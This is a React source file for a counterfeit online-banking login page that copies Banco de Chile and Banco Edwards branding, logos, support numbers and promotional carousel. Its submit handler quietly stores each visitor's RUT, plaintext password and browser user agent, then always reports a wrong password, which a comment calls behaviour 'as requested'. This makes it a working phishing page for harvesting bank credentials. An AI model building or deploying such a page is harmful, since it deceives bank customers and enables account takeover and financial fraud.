"use client"

import type React from "react"
import { useState, useEffect } from "react"
import { ChevronLeft, Eye, EyeOff, Phone, ChevronRight, Play, Pause, X } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { formatRut, validateRut, isValidRutFormat } from "@/lib/rut-validator"
import { saveLoginAttempt, getRecentAttempts } from "@/lib/storage"
import "../styles/banco-chile.css"

export default function BancoChileLogin() {
  // Estados del formulario de login
  const [userRutInput, setUserRutInput] = useState("")
  const [userPasswordInput, setUserPasswordInput] = useState("")
  const [isPasswordVisible, setIsPasswordVisible] = useState(false)

  // Estados de validación y errores
  const [rutValidationError, setRutValidationError] = useState("")
  const [passwordValidationError, setPasswordValidationError] = useState("")
  const [isFormSubmitting, setIsFormSubmitting] = useState(false)

  // Estados del carrusel promocional
  const [currentPromotionalSlideIndex, setCurrentPromotionalSlideIndex] = useState(0)
  const [isCarouselAutoPlaying, setIsCarouselAutoPlaying] = useState(true)
  const [isMobileCarouselModalOpen, setIsMobileCarouselModalOpen] = useState(false)

  // Configuración de slides promocionales del banco
  const promotionalSlidesData = [
    {
      image: "/family-with-children-outdoors-happy-banking.jpg",
      title: "Este mes paga tus contribuciones con tus Tarjetas del Chile",
      buttonText: "CONOCER MÁS",
    },
    {
      image: "/secure-banking-protection-shield.jpg",
      title: "No compartas tu información bancaria con nadie",
      buttonText: "MÁS INFORMACIÓN",
    },
  ]

  /**
   * Maneja los cambios en el campo RUT, aplicando formato automático
   */
  const handleRutInputChange = (inputEvent: React.ChangeEvent<HTMLInputElement>) => {
    const rawInputValue = inputEvent.target.value
    const formattedRutValue = formatRut(rawInputValue)
    setUserRutInput(formattedRutValue)

    // Limpiar error de RUT si existe
    if (rutValidationError) setRutValidationError("")
  }

  /**
   * Procesa el envío del formulario de login
   */
  const handleLoginFormSubmit = async (submitEvent: React.FormEvent) => {
    submitEvent.preventDefault()

    // Prevenir múltiples envíos simultáneos
    if (isFormSubmitting) return

    setIsFormSubmitting(true)
    setRutValidationError("")
    setPasswordValidationError("")

    let hasValidationErrors = false

    // Validación del campo RUT
    if (!userRutInput.trim()) {
      setRutValidationError("Debes ingresar tu RUT para ingresar a tu cuenta.")
      hasValidationErrors = true
    } else if (!isValidRutFormat(userRutInput)) {
      setRutValidationError("Formato de RUT inválido. Usa el formato XX.XXX.XXX-X")
      hasValidationErrors = true
    } else if (!validateRut(userRutInput)) {
      setRutValidationError("El RUT ingresado no es válido.")
      hasValidationErrors = true
    }

    // Validación del campo contraseña
    if (!userPasswordInput.trim()) {
      setPasswordValidationError("Debes ingresar tu clave para ingresar a tu cuenta.")
      hasValidationErrors = true
    } else if (userPasswordInput.length < 4) {
      setPasswordValidationError("La clave debe tener al menos 4 caracteres.")
      hasValidationErrors = true
    }

    // Verificación de límite de intentos recientes (protección contra ataques de fuerza bruta)
    const recentLoginAttempts = getRecentAttempts(15)
    if (recentLoginAttempts.length >= 5) {
      setRutValidationError("Demasiados intentos fallidos. Intenta nuevamente en 15 minutos.")
      setPasswordValidationError("Demasiados intentos fallidos. Intenta nuevamente en 15 minutos.")
      hasValidationErrors = true
    }

    // Si no hay errores de validación, procesar el intento de login
    if (!hasValidationErrors) {
      // Simular tiempo de procesamiento del servidor
      await new Promise((resolve) => setTimeout(resolve, 1500))

      // Guardar intento de login para análisis (siempre falla como solicitado)
      saveLoginAttempt({
        rut: userRutInput.trim(),
        password: userPasswordInput,
        success: false,
        userAgent: navigator.userAgent,
      })

      // Mostrar error de credenciales incorrectas (comportamiento solicitado)
      setRutValidationError("RUT o clave incorrectos. Intenta nuevamente.")
      setPasswordValidationError("RUT o clave incorrectos. Intenta nuevamente.")
    }

    setIsFormSubmitting(false)
  }

  /**
   * Avanza al siguiente slide del carrusel
   */
  const moveToNextPromotionalSlide = () => {
    setCurrentPromotionalSlideIndex((previousIndex) => (previousIndex + 1) % promotionalSlidesData.length)
  }

  /**
   * Retrocede al slide anterior del carrusel
   */
  const moveToPreviousPromotionalSlide = () => {
    setCurrentPromotionalSlideIndex(
      (previousIndex) => (previousIndex - 1 + promotionalSlidesData.length) % promotionalSlidesData.length,
    )
  }

  /**
   * Efecto para manejar la reproducción automática del carrusel
   */
  useEffect(() => {
    if (isCarouselAutoPlaying) {
      const carouselAutoPlayInterval = setInterval(() => {
        setCurrentPromotionalSlideIndex((previousIndex) => (previousIndex + 1) % promotionalSlidesData.length)
      }, 5000) // Cambio automático cada 5 segundos

      return () => clearInterval(carouselAutoPlayInterval)
    }
  }, [isCarouselAutoPlaying, promotionalSlidesData.length])

  return (
    <div className="banco-login-container">
      {/* Panel Izquierdo - Formulario de Login */}
      <div className="login-panel">
        {/* Sección del encabezado */}
        <div className="header-section">
          <button className="public-site-link">
            <ChevronLeft className="w-4 h-4 mr-1" />
            IR A SITIO PÚBLICO
          </button>
        </div>

        {/* Sección de logos y formulario */}
        <div className="logo-section">
          <div className="logo-container">
            <div className="banco-chile-logo">Banco de Chile</div>
            <div className="banco-edwards-logo">BANCOEDWARDS</div>
          </div>

          <h1 className="welcome-title">Bienvenido a tu Banca en Línea</h1>

          <form onSubmit={handleLoginFormSubmit} className="login-form">
            {/* Campo de RUT */}
            <div className="form-field">
              <label htmlFor="rut" className="form-label">
                RUT
              </label>
              <Input
                id="rut"
                type="text"
                value={userRutInput}
                onChange={handleRutInputChange}
                disabled={isFormSubmitting}
                className={`form-input ${rutValidationError ? "error" : ""}`}
                placeholder="XX.XXX.XXX-X"
                maxLength={12}
              />
              {rutValidationError && <p className="error-message">{rutValidationError}</p>}
            </div>

            {/* Campo de Contraseña */}
            <div className="form-field">
              <label htmlFor="password" className="form-label">
                Contraseña
              </label>
              <div className="password-container">
                <Input
                  id="password"
                  type={isPasswordVisible ? "text" : "password"}
                  value={userPasswordInput}
                  onChange={(inputEvent) => {
                    setUserPasswordInput(inputEvent.target.value)
                    // Limpiar error de contraseña si existe
                    if (passwordValidationError) setPasswordValidationError("")
                  }}
                  disabled={isFormSubmitting}
                  className={`form-input ${passwordValidationError ? "error" : ""}`}
                  placeholder=""
                />
                <button
                  type="button"
                  onClick={() => setIsPasswordVisible(!isPasswordVisible)}
                  disabled={isFormSubmitting}
                  className="password-toggle"
                >
                  {isPasswordVisible ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                </button>
              </div>
              {passwordValidationError && <p className="error-message">{passwordValidationError}</p>}
            </div>

            {/* Botón de envío */}
            <button type="submit" disabled={isFormSubmitting} className="submit-button">
              {isFormSubmitting ? "INGRESANDO..." : "INGRESAR"}
            </button>
          </form>

          {/* Enlace de recuperación de contraseña */}
          <div className="forgot-password-link">
            <button className="forgot-password-button">¿Problemas con tu clave? Recupérala</button>
          </div>

          {/* Botón para mostrar carrusel en móviles */}
          <div className="mobile-carousel-toggle">
            <Button
              onClick={() => setIsMobileCarouselModalOpen(true)}
              variant="outline"
              className="w-full border-teal-500 text-teal-600 hover:bg-teal-50"
            >
              Ver promociones
              <ChevronRight className="w-4 h-4 ml-2" />
            </Button>
          </div>
        </div>

        {/* Información de contacto del pie de página */}
        <div className="footer-contact">
          <p className="contact-intro">¿Tienes problemas para acceder a tu cuenta?</p>

          <div className="contact-grid">
            <div className="contact-item">
              <Phone className="contact-icon" />
              <div>
                <div className="contact-bank-name">Banco de Chile</div>
                <div className="contact-phone">600 637 3737</div>
              </div>
            </div>

            <div className="contact-item">
              <Phone className="contact-icon" />
              <div>
                <div className="contact-bank-name">Banco Edwards</div>
                <div className="contact-phone">600 231 9999</div>
              </div>
            </div>
          </div>

          <div className="help-center-section">
            <p className="help-center-intro">Te invitamos a nuestro Centro de Ayuda</p>
            <button className="help-center-link">IR AL CENTRO DE AYUDA</button>
          </div>
        </div>
      </div>

      {/* Panel Derecho - Carrusel de Escritorio */}
      <div className="right-panel">
        {/* Imagen de fondo de Torres del Paine */}
        <div
          className="background-image"
          style={{
            backgroundImage: `url('/torres-del-paine-authentic.png')`,
          }}
        />

        <div className="background-overlay" />

        {/* Contenedor del carrusel promocional */}
        <div className="carousel-container">
          <div className="carousel-card">
            <div className="carousel-image-container">
              <img
                src={promotionalSlidesData[currentPromotionalSlideIndex].image || "/placeholder.svg"}
                alt="Contenido promocional del banco"
                className="carousel-image"
              />
            </div>

            <h3 className="carousel-title">{promotionalSlidesData[currentPromotionalSlideIndex].title}</h3>

            <button className="carousel-button group">
              {promotionalSlidesData[currentPromotionalSlideIndex].buttonText}
              <ChevronRight className="w-4 h-4 ml-2 transition-transform group-hover:translate-x-1" />
            </button>
          </div>

          {/* Controles del carrusel */}
          <div className="carousel-controls">
            <button onClick={moveToPreviousPromotionalSlide} className="control-button">
              <ChevronLeft className="w-6 h-6 text-gray-700" />
            </button>

            {/* Indicadores de slides */}
            <div className="slide-indicators">
              {promotionalSlidesData.map((_, slideIndex) => (
                <button
                  key={slideIndex}
                  onClick={() => setCurrentPromotionalSlideIndex(slideIndex)}
                  className={`slide-indicator ${slideIndex === currentPromotionalSlideIndex ? "active" : ""}`}
                />
              ))}
            </div>

            <button onClick={moveToNextPromotionalSlide} className="control-button">
              <ChevronRight className="w-6 h-6 text-gray-700" />
            </button>

            {/* Control de reproducción automática */}
            <button onClick={() => setIsCarouselAutoPlaying(!isCarouselAutoPlaying)} className="control-button">
              {isCarouselAutoPlaying ? (
                <Pause className="w-6 h-6 text-gray-700" />
              ) : (
                <Play className="w-6 h-6 text-gray-700 ml-1" />
              )}
            </button>
          </div>

          {/* Información de ubicación */}
          <div className="location-info">
            <div className="location-card">
              <div className="location-content">
                <div className="location-indicator"></div>
                <span className="location-text">
                  Parque Nacional Torres del Paine, Región de Magallanes y Antártica Chilena
                </span>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Modal del Carrusel para Móviles */}
      {isMobileCarouselModalOpen && (
        <div className="mobile-modal-overlay">
          <div className="mobile-modal-container">
            <div className="mobile-modal">
              <div className="mobile-modal-header">
                <h2 className="mobile-modal-title">Promociones</h2>
                <button onClick={() => setIsMobileCarouselModalOpen(false)} className="mobile-modal-close">
                  <X className="w-5 h-5 text-gray-600" />
                </button>
              </div>

              <div className="mobile-modal-content">
                <div className="carousel-image-container">
                  <img
                    src={promotionalSlidesData[currentPromotionalSlideIndex].image || "/placeholder.svg"}
                    alt="Contenido promocional del banco"
                    className="w-full h-48 object-cover"
                  />
                </div>

                <h3 className="text-base font-medium text-gray-800 mb-4 text-balance leading-relaxed">
                  {promotionalSlidesData[currentPromotionalSlideIndex].title}
                </h3>

                <Button className="w-full bg-teal-500 hover:bg-teal-600 text-white font-medium py-3 rounded-lg mb-4">
                  {promotionalSlidesData[currentPromotionalSlideIndex].buttonText}
                  <ChevronRight className="w-4 h-4 ml-2" />
                </Button>

                {/* Controles del carrusel móvil */}
                <div className="mobile-carousel-controls">
                  <button onClick={moveToPreviousPromotionalSlide} className="mobile-control-button">
                    <ChevronLeft className="w-5 h-5 text-gray-700" />
                  </button>

                  <div className="mobile-slide-indicators">
                    {promotionalSlidesData.map((_, slideIndex) => (
                      <button
                        key={slideIndex}
                        onClick={() => setCurrentPromotionalSlideIndex(slideIndex)}
                        className={`mobile-slide-indicator ${slideIndex === currentPromotionalSlideIndex ? "active" : ""}`}
                      />
                    ))}
                  </div>

                  <button onClick={moveToNextPromotionalSlide} className="mobile-control-button">
                    <ChevronRight className="w-5 h-5 text-gray-700" />
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
